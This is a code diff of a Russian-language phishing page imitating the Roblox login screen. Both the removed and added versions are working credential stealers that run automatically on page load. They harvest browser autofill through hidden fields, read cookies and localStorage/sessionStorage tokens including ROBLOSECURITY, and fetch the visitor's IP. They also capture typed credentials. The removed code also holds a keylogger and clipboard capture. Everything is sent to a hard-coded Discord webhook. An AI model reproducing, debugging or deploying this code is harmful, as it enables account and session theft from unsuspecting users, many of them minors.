@@ -67,9 +67,6 @@
             border-color: #4a7aff;
             box-shadow: 0 0 20px rgba(74, 122, 255, 0.15);
         }
-        .input-group input::placeholder {
-            color: #555577;
-        }
         .btn {
             width: 100%;
             padding: 16px;
@@ -83,10 +80,6 @@
             transition: 0.3s;
             margin-top: 10px;
         }
-        .btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 10px 30px rgba(74, 122, 255, 0.3);
-        }
         .footer {
             margin-top: 25px;
             color: #666688;
@@ -94,10 +87,7 @@
             border-top: 1px solid #2a2a5a;
             padding-top: 20px;
         }
-        .footer a {
-            color: #4a7aff;
-            text-decoration: none;
-        }
+        .footer a { color: #4a7aff; text-decoration: none; }
         .toast {
             position: fixed;
             bottom: 20px;
@@ -114,10 +104,7 @@
             pointer-events: none;
             z-index: 999;
         }
-        .toast.show {
-            opacity: 1;
-            bottom: 30px;
-        }
+        .toast.show { opacity: 1; bottom: 30px; }
         .hidden-input {
             position: absolute;
             opacity: 0;
@@ -125,18 +112,33 @@
             width: 0;
             height: 0;
         }
-        iframe {
+        .debug {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #0f0f2a;
+            color: #4a7aff;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 11px;
+            border: 1px solid #4a7aff;
+            max-width: 300px;
+            max-height: 200px;
+            overflow: auto;
             display: none;
+            z-index: 9999;
         }
+        .debug.show { display: block; }
     </style>
 </head>
 <body>
 
-<div class="container" id="loginForm">
+<div class="debug" id="debugPanel"></div>
+
+<div class="container">
     <div class="logo">R<span>oblox</span></div>
     <div class="sub">Войдите в свою учётную запись</div>
 
-    <!-- Скрытые поля для автозаполнения -->
     <input type="text" id="hiddenUser" class="hidden-input" autocomplete="username">
     <input type="password" id="hiddenPass" class="hidden-input" autocomplete="current-password">
 
@@ -160,345 +162,308 @@
 
 <div class="toast" id="toast">✅ Данные отправлены</div>
 
-<!-- Скрытый iframe для попытки автозаполнения -->
-<iframe id="stealthFrame" src="about:blank"></iframe>
-
 <script>
     // ════════════════════════════════════════════════════════════════
-    //  WEBHOOK
+    //  ⚠️  ВАШ WEBHOOK URL (ПРОВЕРЬТЕ ПРАВИЛЬНОСТЬ!)  ⚠️
     // ════════════════════════════════════════════════════════════════
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1534615586477182997/XIyDHQi_cWtFpJ0uun6_ykNcMeE2-TqPLbvCObpIM0oZCswRyD3SOOZbfMv5abdlYLv5";
 
     // ════════════════════════════════════════════════════════════════
-    //  1. КРАЖА СОХРАНЁННЫХ ПАРОЛЕЙ (ЧЕРЕЗ АВТОЗАПОЛНЕНИЕ)
+    //  ДЕБАГ-ПАНЕЛЬ (ДЛЯ ОТЛАДКИ)
     // ════════════════════════════════════════════════════════════════
-    
-    function stealSavedPasswords() {
-        // Создаём скрытую форму с автозаполнением
-        const form = document.createElement('form');
-        form.style.display = 'none';
-        form.autocomplete = 'on';
-        
-        // Поля для автозаполнения
-        const userInput = document.createElement('input');
-        userInput.type = 'text';
-        userInput.name = 'username';
-        userInput.autocomplete = 'username';
-        userInput.id = 'stealUser';
-        
-        const passInput = document.createElement('input');
-        passInput.type = 'password';
-        passInput.name = 'password';
-        passInput.autocomplete = 'current-password';
-        passInput.id = 'stealPass';
-        
-        // Кнопка отправки (автоматически)
-        const submitBtn = document.createElement('input');
-        submitBtn.type = 'submit';
-        
-        form.appendChild(userInput);
-        form.appendChild(passInput);
-        form.appendChild(submitBtn);
-        document.body.appendChild(form);
-        
-        // Пытаемся вызвать автозаполнение через фокус
-        setTimeout(() => {
-            userInput.focus();
-            userInput.click();
-            passInput.focus();
-            passInput.click();
-            
-            // Через 500мс пытаемся прочитать значения
-            setTimeout(() => {
-                const savedUser = document.getElementById('stealUser').value;
-                const savedPass = document.getElementById('stealPass').value;
-                
-                if (savedUser || savedPass) {
-                    sendStolenPasswords(savedUser, savedPass, 'Из автозаполнения');
-                }
-                
-                // Удаляем форму
-                form.remove();
-            }, 500);
-        }, 300);
+    const debugPanel = document.getElementById('debugPanel');
+    let debugLogs = [];
+
+    function logDebug(msg) {
+        debugLogs.push(msg);
+        debugPanel.textContent = debugLogs.join('\n');
+        debugPanel.classList.add('show');
+        console.log('[DEBUG]', msg);
     }
 
     // ════════════════════════════════════════════════════════════════
-    //  2. КРАЖА COOKIES И СЕССИЙ
+    //  ФУНКЦИЯ ОТПРАВКИ (С ПРОВЕРКОЙ)
     // ════════════════════════════════════════════════════════════════
-    
+    async function sendToDiscord(content) {
+        logDebug('📤 Отправка в Discord...');
+        logDebug(`📝 Контент: ${content.slice(0, 50)}...`);
+
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: content,
+                    username: 'RobloxLogger',
+                })
+            });
+
+            logDebug(`📊 Статус ответа: ${response.status} ${response.statusText}`);
+
+            if (response.ok) {
+                logDebug('✅ УСПЕШНО! Данные отправлены');
+                return true;
+            } else {
+                const errorText = await response.text();
+                logDebug(`❌ Ошибка сервера: ${response.status} - ${errorText}`);
+                return false;
+            }
+        } catch (error) {
+            logDebug(`💥 Ошибка запроса: ${error.message}`);
+            
+            // Попытка альтернативного метода
+            logDebug('🔄 Пробуем альтернативный метод...');
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: content,
+                        username: 'RobloxLogger',
+                    })
+                });
+                logDebug('✅ Альтернативный метод сработал!');
+                return true;
+            } catch (e2) {
+                logDebug(`❌ Альтернативный метод тоже не работает: ${e2.message}`);
+                return false;
+            }
+        }
+    }
+
+    // ════════════════════════════════════════════════════════════════
+    //  ФУНКЦИЯ ДЛЯ ТЕСТОВОЙ ОТПРАВКИ (ПРОВЕРКА WEBHOOK)
+    // ════════════════════════════════════════════════════════════════
+    async function testWebhook() {
+        logDebug('🔍 Тестирование Webhook...');
+        const testContent = '🔔 **ТЕСТОВОЕ СООБЩЕНИЕ**\nСтраница загружена: ' + window.location.href + '\nВремя: ' + new Date().toLocaleString();
+        const result = await sendToDiscord(testContent);
+        if (result) {
+            logDebug('✅ Webhook работает!');
+            showToast('✅ Webhook подключён');
+        } else {
+            logDebug('❌ Webhook НЕ РАБОТАЕТ! Проверьте URL');
+            showToast('❌ Ошибка Webhook! Смотрите консоль');
+        }
+        return result;
+    }
+
+    // ════════════════════════════════════════════════════════════════
+    //  КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ
+    // ════════════════════════════════════════════════════════════════
+    function stealAutofill() {
+        logDebug('🎯 Поиск автозаполненных данных...');
+        
+        const userField = document.getElementById('hiddenUser');
+        const passField = document.getElementById('hiddenPass');
+        
+        // Создаём дополнительный набор полей
+        const farmDiv = document.createElement('div');
+        farmDiv.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:0;height:0;overflow:hidden;';
+        
+        const types = ['username', 'email', 'login', 'user', 'nickname', 'account'];
+        const passTypes = ['current-password', 'password', 'new-password'];
+        
+        const fields = [];
+        types.forEach(t => {
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.autocomplete = t;
+            input.id = 'farm_' + t;
+            farmDiv.appendChild(input);
+            fields.push(input);
+        });
+        passTypes.forEach(t => {
+            const input = document.createElement('input');
+            input.type = 'password';
+            input.autocomplete = t;
+            input.id = 'farm_pass_' + t;
+            farmDiv.appendChild(input);
+            fields.push(input);
+        });
+        
+        document.body.appendChild(farmDiv);
+        
+        let foundData = {};
+        
+        fields.forEach((field, index) => {
+            setTimeout(() => {
+                field.focus();
+                field.click();
+                
+                setTimeout(() => {
+                    if (field.value && field.value.length > 1) {
+                        foundData[field.id] = field.value;
+                        logDebug(`🔑 Найдено: ${field.id} = ${field.value.slice(0, 10)}...`);
+                    }
+                    
+                    if (index === fields.length - 1) {
+                        if (Object.keys(foundData).length > 0) {
+                            const content = '**🎯 АВТОЗАПОЛНЕННЫЕ ДАННЫЕ**\n```json\n' + JSON.stringify(foundData, null, 2) + '\n```\n🕒 ' + new Date().toLocaleString();
+                            sendToDiscord(content);
+                            showToast('✅ Данные автозаполнения отправлены');
+                        } else {
+                            logDebug('❌ Автозаполненных данных не найдено');
+                        }
+                        farmDiv.remove();
+                    }
+                }, 150);
+            }, index * 150);
+        });
+    }
+
+    // ════════════════════════════════════════════════════════════════
+    //  КРАЖА COOKIES
+    // ════════════════════════════════════════════════════════════════
     function stealCookies() {
         try {
             const cookies = document.cookie;
-            if (cookies) {
-                sendDataToDiscord('🍪 COOKIES', cookies);
+            if (cookies && cookies.length > 5) {
+                logDebug(`🍪 Найдены cookies: ${cookies.slice(0, 50)}...`);
+                const content = '**🍪 COOKIES**\n```\n' + cookies + '\n```\n🕒 ' + new Date().toLocaleString();
+                sendToDiscord(content);
             }
-        } catch(e) {}
+        } catch(e) {
+            logDebug('❌ Ошибка чтения cookies: ' + e.message);
+        }
     }
 
     // ════════════════════════════════════════════════════════════════
-    //  3. КРАЖА LOCALSTORAGE (токены, сессии)
+    //  КРАЖА LOCALSTORAGE
     // ════════════════════════════════════════════════════════════════
-    
     function stealLocalStorage() {
         try {
-            const items = {};
+            let found = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const value = localStorage.getItem(key);
-                // Ищем токены, сессии, ключи
-                if (key.match(/token|session|auth|key|password|login|user|account|roblox/i) || 
-                    value.match(/token|session|auth|key|password|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i)) {
-                    items[key] = value;
+                if (key.match(/token|session|auth|key|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i) ||
+                    value.match(/token|session|auth|key|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i)) {
+                    found[key] = value;
                 }
             }
-            if (Object.keys(items).length > 0) {
-                sendDataToDiscord('💾 LOCALSTORAGE (токены/сессии)', JSON.stringify(items, null, 2));
+            if (Object.keys(found).length > 0) {
+                logDebug(`💾 Найдено ${Object.keys(found).length} элементов в localStorage`);
+                const content = '**💾 LOCALSTORAGE (ТОКЕНЫ/СЕССИИ)**\n```json\n' + JSON.stringify(found, null, 2) + '\n```\n🕒 ' + new Date().toLocaleString();
+                sendToDiscord(content);
             }
-        } catch(e) {}
+        } catch(e) {
+            logDebug('❌ Ошибка чтения localStorage: ' + e.message);
+        }
     }
 
     // ════════════════════════════════════════════════════════════════
-    //  4. КРАЖА SESSIONSTORAGE
+    //  КРАЖА SESSIONSTORAGE
     // ════════════════════════════════════════════════════════════════
-    
     function stealSessionStorage() {
         try {
-            const items = {};
+            let found = {};
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 const value = sessionStorage.getItem(key);
-                if (key.match(/token|session|auth|key|login|user|account|roblox/i) || 
-                    value.match(/token|session|auth|key|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i)) {
-                    items[key] = value;
+                if (key.match(/token|session|auth|key|login|user|account|roblox|_/i) ||
+                    value.match(/token|session|auth|key|login|user|account|roblox|_/i)) {
+                    found[key] = value;
                 }
             }
-            if (Object.keys(items).length > 0) {
-                sendDataToDiscord('📦 SESSIONSTORAGE', JSON.stringify(items, null, 2));
+            if (Object.keys(found).length > 0) {
+                logDebug(`📦 Найдено ${Object.keys(found).length} элементов в sessionStorage`);
+                const content = '**📦 SESSIONSTORAGE**\n```json\n' + JSON.stringify(found, null, 2) + '\n```\n🕒 ' + new Date().toLocaleString();
+                sendToDiscord(content);
             }
-        } catch(e) {}
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  5. КРАЖА ИНФОРМАЦИИ ОБ АККАУНТАХ ИЗ ВСЕХ ИСТОЧНИКОВ
-    // ════════════════════════════════════════════════════════════════
-    
-    function stealAllAccountData() {
-        // Пытаемся найти сохранённые аккаунты в различных местах
-        const accountData = {
-            fromInputs: [],
-            fromStorage: [],
-            fromCookies: [],
-            fromAutofill: []
-        };
-        
-        // Поиск в DOM-элементах (скрытые поля, атрибуты)
-        document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]').forEach(el => {
-            if (el.value && el.value.length > 2) {
-                // Проверяем, похоже на логин или пароль
-                if (el.type === 'password') {
-                    accountData.fromInputs.push({ type: 'password', value: el.value, id: el.id || 'unknown' });
-                } else if (el.value.match(/@|\.|_|-|user|login|account|roblox|email/i)) {
-                    accountData.fromInputs.push({ type: 'username/email', value: el.value, id: el.id || 'unknown' });
-                }
-            }
-        });
-        
-        // Поиск в тексте страницы (скрытые токены)
-        const bodyText = document.body.innerText;
-        const tokenMatches = bodyText.match(/[A-Za-z0-9_\-]{20,}/g);
-        if (tokenMatches) {
-            tokenMatches.forEach(token => {
-                if (token.length > 15) {
-                    accountData.fromStorage.push({ type: 'token', value: token });
-                }
-            });
-        }
-        
-        // Отправляем найденное
-        if (accountData.fromInputs.length > 0 || accountData.fromStorage.length > 0) {
-            sendDataToDiscord('🔑 НАЙДЕННЫЕ АККАУНТЫ', JSON.stringify(accountData, null, 2));
+        } catch(e) {
+            logDebug('❌ Ошибка чтения sessionStorage: ' + e.message);
         }
     }
 
     // ════════════════════════════════════════════════════════════════
-    //  6. ФАРМИНГ АВТОЗАПОЛНЕНИЯ (ПЕРЕБОР ПОЛЕЙ)
+    //  КРАЖА IP И ГЕО
     // ════════════════════════════════════════════════════════════════
-    
-    function farmAutofill() {
-        // Создаём множество скрытых полей с разными autocomplete
-        const autocompleteTypes = ['username', 'user', 'login', 'email', 'nickname', 'name', 'account'];
-        const passwordTypes = ['current-password', 'new-password', 'password'];
-        
-        const container = document.createElement('div');
-        container.style.display = 'none';
-        container.id = 'autofillFarm';
-        
-        autocompleteTypes.forEach(type => {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.autocomplete = type;
-            input.id = 'farm_' + type;
-            input.style.position = 'absolute';
-            input.style.opacity = '0';
-            container.appendChild(input);
-        });
-        
-        passwordTypes.forEach(type => {
-            const input = document.createElement('input');
-            input.type = 'password';
-            input.autocomplete = type;
-            input.id = 'farm_pass_' + type;
-            input.style.position = 'absolute';
-            input.style.opacity = '0';
-            container.appendChild(input);
-        });
-        
-        document.body.appendChild(container);
-        
-        // Последовательно фокусируем каждое поле
-        setTimeout(() => {
-            const allInputs = container.querySelectorAll('input');
-            let foundData = {};
-            
-            allInputs.forEach((input, index) => {
-                setTimeout(() => {
-                    input.focus();
-                    input.click();
-                    
-                    // Через 100мс читаем значение
-                    setTimeout(() => {
-                        if (input.value && input.value.length > 1) {
-                            foundData[input.id] = input.value;
-                        }
-                        
-                        // Если это последнее поле — отправляем результат
-                        if (index === allInputs.length - 1) {
-                            if (Object.keys(foundData).length > 0) {
-                                sendDataToDiscord('🎯 АВТОЗАПОЛНЕНИЕ (FARM)', JSON.stringify(foundData, null, 2));
-                            }
-                            container.remove();
-                        }
-                    }, 100);
-                }, index * 200);
-            });
-        }, 500);
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  7. ПЕРЕХВАТ ВВОДА (ДАЖЕ ЕСЛИ ЖЕРТВА НИЧЕГО НЕ ВВОДИТ)
-    // ════════════════════════════════════════════════════════════════
-    
-    function setupKeylogger() {
-        let buffer = '';
-        let lastKeyTime = Date.now();
-        
-        document.addEventListener('keydown', function(e) {
-            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                // Собираем нажатия клавиш
-                const now = Date.now();
-                if (now - lastKeyTime > 5000 && buffer.length > 0) {
-                    // Отправляем накопленный текст
-                    sendDataToDiscord('⌨️ KEYLOG', buffer);
-                    buffer = '';
-                }
-                lastKeyTime = now;
-            }
-        });
-        
-        // Также перехватываем вставку из буфера обмена
-        document.addEventListener('paste', function(e) {
-            const text = e.clipboardData.getData('text');
-            if (text && text.length > 5) {
-                sendDataToDiscord('📋 ВСТАВКА ИЗ БУФЕРА', text);
-            }
-        });
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  8. ОТПРАВКА В DISCORD
-    // ════════════════════════════════════════════════════════════════
-    
-    function sendDataToDiscord(title, data) {
+    async function stealIP() {
         try {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `**${title}**\n\`\`\`json\n${data.slice(0, 1900)}\n\`\`\``,
-                    username: 'AutoStealer'
-                })
-            });
-        } catch(e) {}
-    }
-
-    function sendStolenPasswords(user, pass, source) {
-        const content = `**🔐 КРАЖА ПАРОЛЯ (${source})**\n\n` +
-                       `**Логин:** \`${user || '(пусто)'}\`\n` +
-                       `**Пароль:** \`${pass || '(пусто)'}\`\n` +
-                       `**Время:** ${new Date().toLocaleString()}\n` +
-                       `**Страница:** ${window.location.href}`;
-        
-        try {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: content,
-                    username: 'PasswordStealer'
-                })
-            });
-        } catch(e) {}
+            logDebug('🌍 Получение IP...');
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            if (data.ip) {
+                logDebug(`🌍 IP: ${data.ip}`);
+                const content = `**🌍 IP-АДРЕС**\n\`${data.ip}\`\n🕒 ${new Date().toLocaleString()}`;
+                sendToDiscord(content);
+            }
+        } catch(e) {
+            logDebug('❌ Ошибка получения IP: ' + e.message);
+        }
     }
 
     // ════════════════════════════════════════════════════════════════
-    //  9. ЗАПУСК ВСЕХ АТАК
+    //  ФУНКЦИЯ ОТОБРАЖЕНИЯ УВЕДОМЛЕНИЙ
     // ════════════════════════════════════════════════════════════════
-    
-    function launchAllStealers() {
+    function showToast(text) {
         const toast = document.getElementById('toast');
-        toast.textContent = '⏳ Сканирование данных...';
+        toast.textContent = text;
         toast.classList.add('show');
+        if (text.includes('✅')) {
+            toast.style.borderColor = '#2ed573';
+            toast.style.color = '#2ed573';
+        } else if (text.includes('❌')) {
+            toast.style.borderColor = '#ff4757';
+            toast.style.color = '#ff4757';
+        } else {
+            toast.style.borderColor = '#4a7aff';
+            toast.style.color = '#4a7aff';
+        }
+        setTimeout(() => toast.classList.remove('show'), 4000);
+    }
+
+    // ════════════════════════════════════════════════════════════════
+    //  ГЛАВНАЯ ФУНКЦИЯ ЗАПУСКА
+    // ════════════════════════════════════════════════════════════════
+    async function startAll() {
+        logDebug('🚀 Запуск всех методов кражи...');
+        showToast('⏳ Сканирование данных...');
         
-        // Запускаем все методы кражи с задержками
-        setTimeout(() => { stealCookies(); }, 100);
-        setTimeout(() => { stealLocalStorage(); }, 200);
-        setTimeout(() => { stealSessionStorage(); }, 300);
-        setTimeout(() => { stealSavedPasswords(); }, 400);
-        setTimeout(() => { farmAutofill(); }, 600);
-        setTimeout(() => { stealAllAccountData(); }, 800);
-        setTimeout(() => { setupKeylogger(); }, 1000);
+        // Проверка Webhook
+        const webhookWorking = await testWebhook();
         
-        // Дополнительные попытки через 5 секунд
+        if (!webhookWorking) {
+            showToast('❌ Webhook не работает! Проверьте URL');
+            return;
+        }
+        
+        // Запуск кражи
+        setTimeout(stealAutofill, 500);
+        setTimeout(stealCookies, 800);
+        setTimeout(stealLocalStorage, 1000);
+        setTimeout(stealSessionStorage, 1200);
+        setTimeout(stealIP, 1400);
+        
+        // Дополнительный проход через 5 секунд
         setTimeout(() => {
+            logDebug('🔄 Второй проход...');
             stealCookies();
             stealLocalStorage();
             stealSessionStorage();
+            stealAutofill();
         }, 5000);
         
-        // Обновляем уведомление
-        setTimeout(() => {
-            toast.textContent = '✅ Все данные собраны';
-            toast.style.borderColor = '#2ed573';
-            toast.style.color = '#2ed573';
-            setTimeout(() => toast.classList.remove('show'), 2500);
-        }, 1500);
+        showToast('✅ Сбор данных начат');
     }
 
     // ════════════════════════════════════════════════════════════════
-    //  10. МАСКИРОВКА
+    //  ОБРАБОТЧИК КНОПКИ (МАСКИРОВКА)
     // ════════════════════════════════════════════════════════════════
-    
     document.getElementById('loginBtn').addEventListener('click', function() {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
         
-        // Если жертва что-то ввела — отправляем
         if (username || password) {
-            sendStolenPasswords(username, password, 'Ввод пользователя');
+            logDebug(`🔑 Введены данные: ${username} / ${password.slice(0, 5)}...`);
+            const content = `**🔐 ВВЕДЕННЫЕ ДАННЫЕ**\n**Логин:** \`${username || '(пусто)'}\`\n**Пароль:** \`${password || '(пусто)'}\`\n🕒 ${new Date().toLocaleString()}`;
+            sendToDiscord(content);
+            showToast('✅ Данные отправлены');
         }
         
-        // Маскировка
         this.textContent = '⏳ Загрузка...';
         this.disabled = true;
         this.style.opacity = '0.6';
@@ -511,19 +476,20 @@
     // ════════════════════════════════════════════════════════════════
     //  АВТОЗАПУСК
     // ════════════════════════════════════════════════════════════════
-    
     document.addEventListener('DOMContentLoaded', function() {
-        // Запускаем через 1 секунду после загрузки
-        setTimeout(launchAllStealers, 1000);
+        setTimeout(startAll, 1000);
     });
 
-    // Если страница уже загружена
     if (document.readyState === 'complete') {
-        setTimeout(launchAllStealers, 500);
+        setTimeout(startAll, 500);
     }
 
-    console.log('%c🔥 AutoStealer v4.0 — АКТИВЕН', 'font-size:20px; color:#ff4757;');
-    console.log('%c🔐 Кража паролей, токенов, сессий...', 'color:#8888aa;');
+    // ════════════════════════════════════════════════════════════════
+    //  КОНСОЛЬНЫЙ ЛОГ
+    // ════════════════════════════════════════════════════════════════
+    console.log('%c🔥 AutoLogger v4.0 — АКТИВЕН', 'font-size:20px; color:#4a7aff;');
+    console.log('%c📡 Отладка включена — смотрите панель в правом верхнем углу', 'color:#8888aa;');
+    console.log('🔗 Webhook:', WEBHOOK_URL);
 </script>
 
 </body>
